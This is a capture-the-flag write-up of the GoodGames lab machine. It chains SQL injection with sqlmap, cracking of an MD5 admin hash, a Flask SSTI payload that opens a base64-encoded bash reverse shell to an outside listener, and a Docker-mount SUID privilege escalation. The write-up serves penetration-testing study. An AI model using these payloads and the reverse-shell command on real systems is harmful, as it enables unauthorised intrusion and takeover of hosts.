# GoodGames

*Linux* - Shows the importance of sanitizing user inputs to prevent SQLi, using strong hashing algorithms in database structure to prevent the extraction and cracking.

Also highlights the dangers of using 'render_template_string' in a Python web app where user input is reflected, allowing SSTI attacks. 

Privilege escalation involves docker hosts enumeration and shows how having admin privileges in a container and low privilege user on the host machine can be dangerous.

--------------

`nmap` scan only shows one open port:

```sh
nmap -sC -sV -T4 10.10.11.130

PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
```

After some recon on the web, I saw there is a login page, which sends a `POST` request on `/login`, I provide there some email and password, and observe the request on Burp Suite.

The body is:

```http
email=test%40test.com&password=Test1
```

I save this request to a file, and start the `sqlmap` to see if we have a SQLi here, and if yes to get the databases.

```sh
python3 sqlmap.py -r ../../../GoodGames_Login.txt --dbs
```

This turns out to be true, and I got the following databases:

```sh
available databases [2]:
[*] information_schema
[*] main
```

Now, let's get the tables of the database `Main`.

```sh
python3 sqlmap.py -r ../../../GoodGames_Login.txt -D main --tables
```

It has three tables, and one of them is of big importance.

```sh
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
```

Now, let's dump the users.

```sh
python3 sqlmap.py -r ../../../GoodGames_Login.txt -D main -T user --dump
```

This provided the admin user and it's password hash:

```sh
Database: main
Table: user
[1 entry]
+----+---------------------+--------+----------------------------------+
| id | email               | name   | password                         |
+----+---------------------+--------+----------------------------------+
| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+---------------------+--------+----------------------------------+
```

After google searching for this, we saw an `MD5 reverse` for it which shows the password in clear-text `superadministrator`.

Then I use these to login which sends us to the `Admin's Profile`.

There's not much to it, but in the top-right corner, there is a settings icon, which tries to go to `internal-administration.goodgames.htb`, but that can't be found on the browser.

Let's try to add this to our `/etc/hosts` file.

```sh
10.10.11.130 internal-administration.goodgames.htb
```

And now when I try to visit it, it sends us to an `Open-source Flask Dashboard` login page.

Let's try to reuse the credentials to login. It doesn't work. Let's reuse the password, with a common user for admins `admin`.

And this logs us in to the administrator dashboard.

There is an option to change the account details, where we can put our Full Name, which then is reflected.

But, when I change the Name to `{{7*7}}` it changes the name to 49, meaning that we can execute code here, as there is a SSTI vulnerability on Flask.

Now, after searching on internet for SSTI on Flask, I found a PoC:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

And after putting this on the name, it provided us the with the output of the `id` system command.

Now let's find a reverse shell one liner, to put instead of the `id` command.

```sh
sh -i >& /dev/tcp/10.10.14.37/4444 0>&1
```

Encode it to base 64:

```sh
echo 'bash -i >& /dev/tcp/10.10.14.37/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNy80NDQ0IDA+JjEK
```

Start a listening service:

```sh
nc -nlvp 4444
```

Put this on your name:

```sh
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNy80NDQ0IDA+JjEK${IFS}|base64${IFS}-d|bash').read()}}
```

And I got access to the server, and when I execute the `whoami` command, it shows:

```sh
whoami
root
```

My current directory is `/backend` and on the home directory I got a user `augustus`, inside which there is a file `user.txt`, which when I `cat` gives me `ac0288acc199c113156e111951a5a9b7` the flag.

Also, on this directory the `ls -la` gave something not so usual:

```sh
# cd augustus
# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 root 1000   33 Mar 19 12:17 user.txt
# 
```

This tells that the owner of this files is not `augustus` but the `id 1000`, meaning that the user's home directory is mounted inside the docker container from the main system.

Also there is no user `augustus` or `1000` in `/etc/passwd`.

We confirm this by:

```sh
mount | grep home
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

By executing `ip a` we see our ip which is `172.19.0.2` meaning that the host should be `172.19.0.1`.

Let's ping it.

```sh
# ping 172.19.0.1
PING 172.19.0.1 (172.19.0.1) 56(84) bytes of data.
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.087 ms
64 bytes from 172.19.0.1: icmp_seq=2 ttl=64 time=0.060 ms
```

This confirms that this is alive.

`nmap` is not installed, so we should scan this for open ports using `bash`.

```sh
for port in {1..1000}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

This gave us two ports that are open:

```sh
22 open
80 open
```

We know that `22 open` means that we have an `ssh` service running in there, so let's try to connect with the user augustus.

It didn't allow us saying `Permission denied` so let's start a script in the /dev/null.

```sh
script /dev/null bash
```

Try to login again, and now it asks for the password, try to reuse it `superadministrator`, and we got access to the system.

```sh
# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ 

```

Now we know that the home directory is mounted in the Docker, where have root permissions.

But, here now we don't have this kind of privilege, as we don't have access to the `/root/` directory.

But we can write files in the host and change their permissions to root from within the container, permissions which will be reflected to the host system as well.

We will use this to make the `bash` of the host with the permissions of the `root` from the docker container, and then send it back to the host, so we will escalate privileges.

```sh
cp /bin/bash .
exit
```

Now we are in the container again, and we see that on the `/home/augustus` we have the `bash` file.

Change the ownership to `root:root` and apply the `SUID` bit, and then ssh back to the host, and check the permissions.

```sh
chown root:root bash
chmod 4755 bash
ssh augustus172.19.0.1
```

```
ls -la
-rwsr-xr-x 1 root     root     1234376 Mar 19 15:41 bash
```

We see that they are reflected, and now execute it to spawn a shell with the UID of the `root`.

```sh
./bash -p
cd /root
ls
root.txt
cat root.txt
d9355960ea1ace359f9b09837fb80cc4
```


